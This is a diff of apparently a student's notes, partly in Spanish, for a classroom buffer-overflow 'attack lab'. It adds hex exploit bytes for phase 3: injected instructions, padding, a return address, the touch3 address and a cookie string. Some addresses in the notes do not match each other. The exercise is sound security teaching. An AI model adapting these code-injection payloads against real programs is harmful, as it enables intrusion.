@@ -18,6 +18,7 @@ cat phase5.txt | ./hex2raw | ./rtarget -q
 a4 1c 40 00 00 00 00 00 -> Direccion del touch 1
 
 
+
 2.
 
 48 c7 c7 f8 4f bf 5f 68 -> Cookie
@@ -26,7 +27,24 @@ de 1c 40 00 c3 00 00 00 -> Push dir memoria touch2
 98 1c 68 55 00 00 00 00 -> Return address rsp 
 
 
-3. 
+3.
+48 c7 c7 c0 1c 68 55 c3 -> x/s $rsp + 8 + 8 + buffer
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 -> Padding, con una linea menos
+98 1c 68 55 00 00 00 00 -> x/s $rsp
+fa 1d 40 00 00 00 00 00 -> touch3 en la instruccion mov
+35 66 62 66 34 66 66 38 -> cookie 
+
+rsp return add = 0x55667e78
+ahora rsp + 8 + 8 + buffer = 
+55667EA0
+
+mov $0x5681CC0, %rdi 
+ret
+
+
+
+
 
 
 
